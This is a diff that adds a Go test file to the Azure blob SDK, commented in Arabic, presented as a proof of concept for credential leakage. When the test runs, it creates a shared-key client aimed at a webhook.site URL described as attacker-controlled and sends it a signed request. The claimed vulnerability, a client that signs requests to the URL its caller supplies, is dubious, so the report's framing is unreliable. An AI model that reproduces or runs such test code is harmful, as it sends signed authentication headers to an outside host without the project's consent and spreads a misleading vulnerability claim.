@@ -1,0 +1,38 @@
+package azblob
+
+import (
+	"context"
+	"testing"
+	"github.com/Azure/azure-sdk-for-go/sdk/azcore"
+)
+
+// TestImpact_RemoteCredentialLeakage يثبت استغلال الثغرة لتسريب البيانات
+func TestImpact_RemoteCredentialLeakage(t *testing.T) {
+	// 1. الرابط الخبيث (المتحكم به من قبل المهاجم)
+	attackerURL := "https://webhook.site/72d5ef0b-edde-4e82-b103-d71004e44835"
+
+	// 2. إعداد مفاتيح وهمية لإثبات التوقيع الرقمي
+	accountName := "leak_victim"
+	accountKey := "R2VuZXJpYyBLZXkgZm9yIFBvQyAxMjM0NTY3ODkwCg=="
+	
+	cred, err := NewSharedKeyCredential(accountName, accountKey)
+	if err != nil {
+		t.Fatalf("Failed to create credential: %v", err)
+	}
+
+	// 3. الثغرة: إنشاء Client يقبل أي URL خارجي دون فحص
+	// المكان المصاب: NewClientWithSharedKeyCredential
+	client, err := NewClientWithSharedKeyCredential(attackerURL, cred, nil)
+	if err != nil {
+		t.Fatalf("Failed to create client: %v", err)
+	}
+
+	// 4. التنفيذ الفعلي وتسريب الهيدر (OOB Exfiltration)
+	// الـ Pipeline سيقوم بتوقيع الطلب وإرساله للرابط الخارجي
+	pager := client.NewListContainersPager(nil)
+	
+	t.Logf("[!] Sending authenticated request to: %s", attackerURL)
+	
+	// هنا يتم إرسال الطلب فعلياً
+	_, _ = pager.NextPage(context.TODO())
+}
